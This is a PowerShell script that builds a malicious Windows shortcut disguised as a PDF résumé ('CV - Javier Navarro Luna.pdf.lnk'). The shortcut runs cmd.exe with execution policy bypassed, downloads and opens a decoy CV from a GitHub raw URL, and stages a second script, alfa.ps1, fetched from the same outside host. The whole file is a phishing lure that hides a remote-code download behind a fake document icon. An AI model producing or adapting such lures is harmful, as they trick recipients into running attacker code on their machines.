$WshShell = New-Object -ComObject WScript.Shell

$Shortcut = $WshShell.CreateShortcut("$pwd\CV - Javier Navarro Luna.pdf.lnk")

$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/K powershell.exe -nop -ExecutionPolicy Bypass -c `"(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/CV.pdf', '.\CV - Javier Navarro Luna.pdf')`" & start `"`" `"`"CV - Javier Navarro Luna.pdf`" & echo powershell.exe -nop -ExecutionPolicy Bypass -c `"(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.ps1')`""
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,75"
$Shortcut.Save()  
